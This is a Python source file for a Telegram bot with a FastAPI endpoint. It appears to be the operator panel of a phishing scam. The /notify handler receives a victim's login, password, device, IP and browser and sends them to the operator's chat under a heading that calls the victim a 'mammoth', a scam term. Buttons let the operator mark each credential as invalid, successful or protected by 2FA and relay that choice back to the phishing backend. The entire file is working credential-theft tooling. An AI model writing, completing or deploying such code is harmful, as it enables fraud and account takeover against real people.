from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters.callback_data import CallbackData
from aiogram.filters.command import Command
from fastapi import FastAPI, Request
import os
import asyncio
from dotenv import load_dotenv

# Загрузка переменных окружения
load_dotenv()
API_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
BACKEND_URL = os.getenv("BACKEND_URL", "http://127.0.0.1:8000")

# Создание объектов бота и диспетчера
bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# FastAPI приложение
app = FastAPI()

# CallbackData для обработки кнопок
class ActionCallback(CallbackData, prefix="action"):
    action: str

# Обработчик уведомлений от сервера
@app.post("/notify")
async def notify(request: Request):
    data = await request.json()
    login = data.get("login")
    password = data.get("password")
    device = data.get("device")
    ip = data.get("ip")
    browser = data.get("browser")

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("Данные не верны", callback_data=ActionCallback(action="invalid").pack())],
        [InlineKeyboardButton("Успешно", callback_data=ActionCallback(action="success").pack())],
        [InlineKeyboardButton("Есть 2FA", callback_data=ActionCallback(action="2fa").pack())]
    ])

    message = (
        f"Мамонт ввел данные\n"
        f"Логин: {login}\n"
        f"Пароль: {password}\n"
        f"{device}, {ip}, {browser}"
    )
    await bot.send_message(chat_id=ADMIN_ID, text=message, reply_markup=keyboard)
    return {"message": "Notification sent"}

# Обработчик нажатий на кнопки
@dp.callback_query(ActionCallback.filter())
async def handle_callback(callback: types.CallbackQuery, callback_data: ActionCallback):
    action = callback_data.action
    response_url = f"{BACKEND_URL}/bot-response"
    
    # Отправка действия обратно на сервер
    response = {"action": action}
    await bot.answer_callback_query(callback.id, text="Действие обработано.")
    try:
        async with bot.session.post(response_url, json=response) as resp:
            if resp.status == 200:
                result = await resp.json()
                await callback.message.edit_text(
                    f"Действие `{action}` выполнено. Ответ от сервера: {result.get('message', 'OK')}"
                )
            else:
                await callback.message.edit_text("Ошибка на сервере. Проверьте логи.")
    except Exception as e:
        await callback.message.edit_text(f"Ошибка при отправке на сервер: {e}")

# Основной обработчик /start
@dp.message(Command(commands=["start"]))
async def start_command(message: types.Message):
    await message.reply("Бот запущен и готов к работе.")

# Запуск Polling
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
